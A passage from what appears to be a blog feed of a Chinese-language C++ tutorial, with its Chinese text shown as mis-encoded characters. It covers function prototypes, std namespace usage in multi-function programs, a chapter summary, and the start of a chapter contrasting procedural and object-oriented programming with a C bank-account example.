class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹: å£°æ˜ cube å‡½æ•°æ¥å—ä¸€ä¸ª double å‚æ•°ï¼Œè¿”å›ä¸€ä¸ª double å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> side;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the side length of a cube: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; side;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> volume = cube(side); <span class="comment">// è°ƒç”¨ cube å‡½æ•°ï¼Œå°†è¿”å›å€¼èµ‹ç»™ volume</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A cube with side &quot;</span> &lt;&lt; side &lt;&lt; <span class="string">&quot; has a volume of &quot;</span> </span><br><span class="line">              &lt;&lt; volume &lt;&lt; <span class="string">&quot; cubic units.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è¿”å›å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The cube of 2.5 is &quot;</span> &lt;&lt; cube(<span class="number">2.5</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“</span></span><br><span class="line">    <span class="keyword">double</span> result = x * x * x;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// è¿”å›è®¡ç®—ç»“æœ (ç±»å‹å¿…é¡»ä¸å£°æ˜çš„è¿”å›ç±»å‹ double å…¼å®¹)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æˆ–è€…æ›´ç®€æ´åœ°ï¼š</span></span><br><span class="line">    <span class="comment">// return x * x * x; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>åŸå‹:</strong> <code>double cube(double x);</code> å£°æ˜äº†å‡½æ•°çš„æ¥å£ã€‚</li><li>  <strong>è°ƒç”¨:</strong> <code>cube(side)</code> è°ƒç”¨å‡½æ•°ï¼Œ<code>side</code> çš„å€¼è¢«ä¼ é€’ç»™å‚æ•° <code>x</code>ã€‚å‡½æ•°æ‰§è¡Œåè¿”å›ä¸€ä¸ª <code>double</code> å€¼ã€‚</li><li>  <strong>å®šä¹‰:</strong> <code>double cube(double x)</code> æä¾›äº†å‡½æ•°çš„å®ç°ã€‚<code>return result;</code> å°†è®¡ç®—å‡ºçš„ç«‹æ–¹å€¼è¿”å›ç»™è°ƒç”¨è€…ã€‚</li></ul><h3 id="2-4-5-åœ¨å¤šå‡½æ•°ç¨‹åºä¸­ä½¿ç”¨usingç¼–è¯‘æŒ‡ä»¤"><a href="#2-4-5-åœ¨å¤šå‡½æ•°ç¨‹åºä¸­ä½¿ç”¨usingç¼–è¯‘æŒ‡ä»¤" class="headerlink" title="2.4.5 åœ¨å¤šå‡½æ•°ç¨‹åºä¸­ä½¿ç”¨usingç¼–è¯‘æŒ‡ä»¤"></a>2.4.5 åœ¨å¤šå‡½æ•°ç¨‹åºä¸­ä½¿ç”¨usingç¼–è¯‘æŒ‡ä»¤</h3><p>å½“ç¨‹åºåŒ…å«å¤šä¸ªå‡½æ•°æ—¶ï¼Œæ¯ä¸ªå‡½æ•°éƒ½éœ€è¦è®¿é—® <code>std</code> åç§°ç©ºé—´ä¸­çš„å…ƒç´ ï¼ˆå¦‚ <code>cout</code>, <code>cin</code>, <code>endl</code>ï¼‰ã€‚æœ‰å‡ ç§å¤„ç†æ–¹å¼ï¼š</p><ol><li><strong>åœ¨æ¯ä¸ªå‡½æ•°ä¸­éƒ½ä½¿ç”¨ <code>std::</code> å‰ç¼€:</strong> è¿™æ˜¯æœ€å®‰å…¨çš„æ–¹å¼ï¼Œå°¤å…¶æ˜¯åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œä½†å¯èƒ½ä½¿ä»£ç å†—é•¿ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>åœ¨æ¯ä¸ªéœ€è¦è®¿é—® <code>std</code> çš„å‡½æ•°å†…éƒ¨ä½¿ç”¨ <code>using</code> å£°æ˜æˆ– <code>using namespace std;</code>:</strong> è¿™å°† <code>using</code> çš„ä½œç”¨åŸŸé™åˆ¶åœ¨å‡½æ•°å†…éƒ¨ï¼Œå‡å°‘äº†å‘½åå†²çªçš„é£é™©ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// using æŒ‡ä»¤åªåœ¨ func1 å†…éƒ¨æœ‰æ•ˆ</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>; <span class="comment">// using å£°æ˜åªå¼•å…¥ cin</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨ main ä¸­ä¹Ÿéœ€è¦è®¿é—® std</span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line">    func1();</span><br><span class="line">    func2();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li> <strong>åœ¨æ‰€æœ‰å‡½æ•°å®šä¹‰ä¹‹å‰ï¼ˆé€šå¸¸æ˜¯åœ¨æ‰€æœ‰ <code>#include</code> ä¹‹åï¼‰æ”¾ç½®ä¸€ä¸ª <code>using namespace std;</code> æŒ‡ä»¤:</strong> è¿™ä½¿å¾—æ–‡ä»¶ä¸­çš„æ‰€æœ‰åç»­ä»£ç éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>std</code> ä¸­çš„åç§°ï¼Œæ— éœ€ <code>std::</code> å‰ç¼€ã€‚<strong>è¿™ç§æ–¹å¼æœ€ç®€å•ï¼Œä½†åœ¨å¤§å‹é¡¹ç›®ä¸­æˆ–ç¼–å†™å¤´æ–‡ä»¶æ—¶ä¸æ¨èï¼Œå› ä¸ºå®ƒå¯èƒ½å¼•å…¥å…¨å±€å‘½åå†²çªã€‚</strong> å¯¹äºå­¦ä¹ å’Œå°å‹é¡¹ç›®ï¼Œè¿™é€šå¸¸æ˜¯å¯æ¥å—çš„ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (å…¨å±€ using æŒ‡ä»¤):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°† using æŒ‡ä»¤æ”¾åœ¨æ‰€æœ‰å‡½æ•°ä¹‹å¤–</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> number = get_input(); <span class="comment">// ç›´æ¥ä½¿ç”¨ get_input</span></span><br><span class="line">    print_sqrt(number);         <span class="comment">// ç›´æ¥ä½¿ç”¨ print_sqrt</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program finished.&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ç›´æ¥ä½¿ç”¨ cout å’Œ endl</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cannot calculate square root of a negative number.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">double</span> root = <span class="built_in">sqrt</span>(val); <span class="comment">// ç›´æ¥ä½¿ç”¨ sqrt (æ¥è‡ª cmath, å·²åœ¨ std ä¸­)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> input_val;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>; <span class="comment">// ç›´æ¥ä½¿ç”¨ cout</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; input_val;          <span class="comment">// ç›´æ¥ä½¿ç”¨ cin</span></span><br><span class="line">    <span class="keyword">return</span> input_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å“ªç§æ–¹å¼å–å†³äºé¡¹ç›®çš„è§„æ¨¡å’Œä¸ªäºº/å›¢é˜Ÿçš„ç¼–ç è§„èŒƒã€‚å¯¹äºåˆå­¦è€…ç¼–å†™çš„ç®€å•å¤šå‡½æ•°ç¨‹åºï¼Œå°† <code>using namespace std;</code> æ”¾åœ¨ <code>#include</code> ä¹‹åæ˜¯ä¸€ç§å¸¸è§çš„ç®€åŒ–æ–¹æ³•ã€‚</p><h2 id="2-5-æ€»ç»“"><a href="#2-5-æ€»ç»“" class="headerlink" title="2.5 æ€»ç»“"></a>2.5 æ€»ç»“</h2><p>æœ¬ç« å¼•å¯¼æˆ‘ä»¬è¿ˆå‡ºäº†å­¦ä¹ C++çš„ç¬¬ä¸€æ­¥ï¼Œæ¶µç›–äº†ç¼–å†™ã€ç¼–è¯‘å’Œç†è§£ä¸€ä¸ªåŸºæœ¬C++ç¨‹åºæ‰€éœ€çš„ foundational conceptsã€‚</p><p>æˆ‘ä»¬ä»C++ç¨‹åºçš„æ ¸å¿ƒâ€”â€”<code>main()</code>å‡½æ•°å¼€å§‹ï¼Œå®ƒæ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚äº†è§£äº†å¦‚ä½•ä½¿ç”¨æ³¨é‡Šï¼ˆ<code>//</code> å’Œ <code>/* */</code>ï¼‰æ¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚æ¥ç€ï¼Œæˆ‘ä»¬æ¥è§¦äº†C++é¢„å¤„ç†å™¨ï¼Œç‰¹åˆ«æ˜¯ <code>#include</code> æŒ‡ä»¤ï¼Œå®ƒç”¨äºåŒ…å«å¤´æ–‡ä»¶ï¼ˆå¦‚ <code>&lt;iostream&gt;</code>ï¼‰ï¼Œè¿™äº›å¤´æ–‡ä»¶æä¾›äº†å‡½æ•°å’Œå¯¹è±¡çš„å£°æ˜ã€‚æˆ‘ä»¬åŒºåˆ†äº†æ ‡å‡†åº“å¤´æ–‡ä»¶ï¼ˆç”¨ <code>&lt;&gt;</code>ï¼‰å’Œç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶ï¼ˆç”¨ <code>&quot;&quot;</code>ï¼‰ã€‚</p><p>åç§°ç©ºé—´çš„æ¦‚å¿µè¢«å¼•å…¥ï¼Œç‰¹åˆ«æ˜¯ <code>std</code> åç§°ç©ºé—´ï¼Œå®ƒåŒ…å«äº†C++æ ‡å‡†åº“çš„å¤§éƒ¨åˆ†å†…å®¹ã€‚æˆ‘ä»¬å­¦ä¹ äº†è®¿é—® <code>std</code> ä¸­å…ƒç´ çš„ä¸‰ç§æ–¹å¼ï¼šä½¿ç”¨ <code>std::</code> å‰ç¼€ã€<code>using</code> å£°æ˜å’Œ <code>using</code> ç¼–è¯‘æŒ‡ä»¤ï¼Œå¹¶è®¨è®ºäº†å®ƒä»¬çš„é€‚ç”¨åœºæ™¯å’Œæ½œåœ¨é£é™©ã€‚</p><p>æˆ‘ä»¬é‡ç‚¹å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ <code>iostream</code> åº“ä¸­çš„ <code>cout</code> å¯¹è±¡å’Œæ’å…¥è¿ç®—ç¬¦ <code>&lt;&lt;</code> æ¥æ˜¾ç¤ºå„ç§ç±»å‹çš„æ•°æ®ï¼ˆå­—ç¬¦ä¸²ã€æ•´æ•°ã€æµ®ç‚¹æ•°ç­‰ï¼‰ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ <code>endl</code> æˆ– <code>\n</code> è¿›è¡Œæ¢è¡Œã€‚ä»£ç æ ¼å¼åŒ–çš„é‡è¦æ€§ä¹Ÿè¢«å¼ºè°ƒï¼Œä»¥ä¿è¯ä»£ç æ¸…æ™°ã€æ˜“äºç»´æŠ¤ã€‚</p><p>éšåï¼Œæˆ‘ä»¬å­¦ä¹ äº†C++çš„åŸºæœ¬è¯­å¥ç±»å‹ã€‚å£°æ˜è¯­å¥ç”¨äºåˆ›å»ºå˜é‡ï¼ŒæŒ‡å®šå…¶ç±»å‹å’Œåç§°ï¼Œå¹¶å¯ä»¥é€‰æ‹©åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ–ã€‚èµ‹å€¼è¯­å¥ä½¿ç”¨ <code>=</code> è¿ç®—ç¬¦å°†å€¼å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°äº† <code>cout</code> å¦‚ä½•æ™ºèƒ½åœ°å¤„ç†ä¸åŒæ•°æ®ç±»å‹ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡é“¾å¼è°ƒç”¨ <code>&lt;&lt;</code> æ¥æ‹¼æ¥è¾“å‡ºã€‚</p><p>è¾“å…¥æ“ä½œé€šè¿‡ <code>cin</code> å¯¹è±¡å’Œæå–è¿ç®—ç¬¦ <code>&gt;&gt;</code> å®ç°ï¼Œå…è®¸ç¨‹åºä»ç”¨æˆ·é‚£é‡Œè¯»å–æ•°æ®å¹¶å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬åˆæ­¥æ¢è®¨äº†å‡½æ•°ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•è°ƒç”¨åº“å‡½æ•°ï¼ˆå¦‚ <code>&lt;cmath&gt;</code> ä¸­çš„ <code>sqrt()</code>ï¼‰å¹¶ä½¿ç”¨å®ƒä»¬çš„è¿”å›å€¼ã€‚æˆ‘ä»¬äº†è§£äº†å‡½æ•°çš„ä¸åŒå˜ä½“ï¼ˆæœ‰/æ— å‚æ•°ï¼Œæœ‰/æ— è¿”å›å€¼ï¼‰ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰è‡ªå·±çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ç¼–å†™å‡½æ•°åŸå‹ï¼ˆå£°æ˜ï¼‰å’Œå‡½æ•°å®šä¹‰ï¼ˆå®ç°ï¼‰ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡å‡½æ•°è°ƒç”¨æ¥æ‰§è¡Œå®ƒä»¬ã€‚æˆ‘ä»¬è¿˜è®¨è®ºäº†å¦‚ä½•åœ¨åŒ…å«å¤šä¸ªå‡½æ•°çš„ç¨‹åºä¸­ç®¡ç† <code>std</code> åç§°ç©ºé—´çš„ä½¿ç”¨ã€‚</p><p>é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»èƒ½å¤Ÿç¼–å†™ç®€å•çš„C++ç¨‹åºï¼Œå®ç°åŸºæœ¬çš„è¾“å…¥ã€å¤„ç†å’Œè¾“å‡ºåŠŸèƒ½ï¼Œå¹¶å¯¹C++ç¨‹åºçš„ç»“æ„å’Œä¸€äº›æ ¸å¿ƒæ¦‚å¿µæœ‰äº†åˆæ­¥çš„è®¤è¯†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 10 å¯¹è±¡å’Œç±»</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_10/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_10/</url>
      
        <content type="html"><![CDATA[<h2 id="10-1-è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#10-1-è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="10.1 è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹"></a>10.1 è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹</h2><p>åœ¨æ·±å…¥å­¦ä¹ C++çš„ç±»ä¹‹å‰ï¼Œäº†è§£ä¸¤ç§ä¸»è¦çš„ç¼–ç¨‹èŒƒå¼ï¼ˆProgramming Paradigmsï¼‰â€”â€”è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹â€”â€”ä¹‹é—´çš„åŒºåˆ«æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚C++ è¯­è¨€åŒæ—¶æ”¯æŒè¿™ä¸¤ç§èŒƒå¼ï¼Œä½†å…¶å¼ºå¤§çš„é¢å‘å¯¹è±¡ç‰¹æ€§æ˜¯å…¶æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€ã€‚</p><h3 id="è¿‡ç¨‹æ€§ç¼–ç¨‹-Procedural-Programming"><a href="#è¿‡ç¨‹æ€§ç¼–ç¨‹-Procedural-Programming" class="headerlink" title="è¿‡ç¨‹æ€§ç¼–ç¨‹ (Procedural Programming)"></a>è¿‡ç¨‹æ€§ç¼–ç¨‹ (Procedural Programming)</h3><p>è¿‡ç¨‹æ€§ç¼–ç¨‹æ˜¯æœ€æ—©æœŸçš„ç¼–ç¨‹èŒƒå¼ä¹‹ä¸€ï¼ŒåƒCè¯­è¨€å°±æ˜¯å…¸å‹çš„è¿‡ç¨‹æ€§è¯­è¨€ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†ç¨‹åºçœ‹ä½œæ˜¯ä¸€ç³»åˆ—è¦æ‰§è¡Œçš„<strong>è¿‡ç¨‹</strong>æˆ–<strong>å‡½æ•°</strong>ã€‚</p><ul><li>  <strong>å…³æ³¨ç‚¹ï¼š</strong> ä¸»è¦å…³æ³¨ç‚¹åœ¨äº<strong>ç®—æ³•</strong>å’Œ<strong>æ‰§è¡Œæ­¥éª¤</strong>ã€‚ç¨‹åºè¢«åˆ†è§£ä¸ºä¸€ç³»åˆ—çš„å‡½æ•°è°ƒç”¨ã€‚</li><li>  <strong>æ•°æ®å¤„ç†ï¼š</strong> æ•°æ®é€šå¸¸æ˜¯ç‹¬ç«‹äºå‡½æ•°å­˜åœ¨çš„ï¼ˆä¾‹å¦‚å…¨å±€å˜é‡ï¼‰ï¼Œæˆ–è€…ä½œä¸ºå‚æ•°åœ¨å‡½æ•°ä¹‹é—´ä¼ é€’ã€‚æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°æ˜¯åˆ†ç¦»çš„ã€‚</li><li>  <strong>ç»„ç»‡æ–¹å¼ï¼š</strong> ç¨‹åºé€šè¿‡å‡½æ•°çš„å±‚æ¬¡ç»“æ„æ¥ç»„ç»‡ã€‚ä¸€ä¸ªä¸»å‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åˆå¯èƒ½è°ƒç”¨æ›´åº•å±‚çš„å‡½æ•°ã€‚</li><li>  <strong>ç¤ºä¾‹è¯­è¨€ï¼š</strong> C, Pascal, Fortranã€‚</li></ul><p><strong>è¿‡ç¨‹æ€§ç¼–ç¨‹çš„æ€ç»´æ–¹å¼ï¼š</strong> â€œç¨‹åºéœ€è¦æ‰§è¡Œå“ªäº›æ­¥éª¤ï¼Ÿéœ€è¦å“ªäº›å‡½æ•°æ¥å®ç°è¿™äº›æ­¥éª¤ï¼Ÿâ€</p><p><strong>ä¾‹å­ï¼ˆæ¦‚å¿µæ€§ï¼‰ï¼š</strong><br>å‡è®¾è¦ç®¡ç†ä¸€ä¸ªé“¶è¡Œè´¦æˆ·ã€‚åœ¨è¿‡ç¨‹æ€§æ–¹æ³•ä¸­ï¼Œä½ å¯èƒ½ä¼šæœ‰ï¼š</p><ul><li>  ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ˆæ¯”å¦‚ <code>struct</code>ï¼‰æ¥å­˜å‚¨è´¦æˆ·ä¿¡æ¯ï¼ˆè´¦å·ã€ä½™é¢ï¼‰ã€‚</li><li>  ä¸€ç³»åˆ—å‡½æ•°æ¥æ“ä½œè¿™ä¸ªæ•°æ®ç»“æ„ï¼š<code>deposit(account, amount)</code>, <code>withdraw(account, amount)</code>, <code>check_balance(account)</code>ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C è¯­è¨€ç¤ºä¾‹ (è¿‡ç¨‹æ€§)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        acc-&gt;balance += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; acc-&gt;balance &gt;= amount) &#123;</span><br><span class="line">        acc-&gt;balance -= amount;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†é”™è¯¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> check_balance(struct BankAccount* acc) &#123;</span><br><span class="line">    <span class="keyword">return</span> acc-&gt;balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> <span class="title">myAccount</span> =</span> &#123;<span class="number">12345</span>, <span class="number">1000.0</span>&#125;;</span><br><span class="line">    deposit(&amp;myAccount, <span class="number">500.0</span>);</span><br><span class="line">    withdraw(&amp;myAccount, <span class="number">200.0</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ•°æ®ï¼ˆ<code>myAccount</code>ï¼‰å’Œæ“ä½œï¼ˆ<code>deposit</code>, <code>withdraw</code>ï¼‰æ˜¯åˆ†å¼€å®šä¹‰çš„ã€‚</p><h3 id="é¢å‘å¯¹è±¡ç¼–ç¨‹-Object-Oriented-Programming-OOP"><a 